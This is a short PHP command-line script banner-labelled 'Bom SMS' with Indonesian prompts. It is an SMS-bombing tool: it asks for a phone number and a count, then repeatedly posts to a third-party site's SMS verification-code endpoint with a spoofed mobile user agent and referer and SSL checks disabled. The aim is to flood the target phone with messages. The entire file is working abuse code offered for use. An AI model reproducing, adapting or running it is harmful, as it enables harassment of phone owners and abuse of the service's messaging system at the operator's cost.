<?php 
function curl($url, $ua, $data = null){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cok.txt');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	$result = curl_exec($ch);
	return $result;
}

$ua = array(
"user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-J500G Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
"content-type: application/x-www-form-urlencoded",
"referer: https://www.shendas.com/id/",
    );
    
echo "
╭━━━╮╱╱╭╮╱╱╱╱╱╱╱╱╭╮╱╭┳━━━┳╮╱╭╮
┃╭━╮┃╱╱┃┃╱╱╱╱╱╱╱╱┃┃╱┃┃╭━╮┃┃╱┃┃
┃╰━╯┣━━┫┃╭┳┳━╮╭━━┫╰━╯┃┃┃┃┃╰━╯┃
┃╭━━┫┃━┫╰╯╋┫╭╮┫╭╮┣━━╮┃┃┃┃┣━━╮┃
┃┃╱╱┃┃━┫╭╮┫┃┃┃┃╰╯┃╱╱┃┃╰━╯┃╱╱┃┃
╰╯╱╱╰━━┻╯╰┻┻╯╰┻━╮┃╱╱╰┻━━━╯╱╱╰╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯Bom SMS";

echo "\n\n[+]Nomor?  ";
$nmr = trim(fgets(STDIN));
echo "[+]Brapa?  ";
$brp = trim(fgets(STDIN));
echo "\n";
for ($i = 0; $i < $brp; $i++){
$data = "phone=$nmr&dest=62&code=8748&recommend=6033306&code_rand=1612725492763&lang=id";

$send = curl("https://www.shendas.com/api/sms/sendSMSCode", $ua, $data);
echo "$send\n";
}
?>
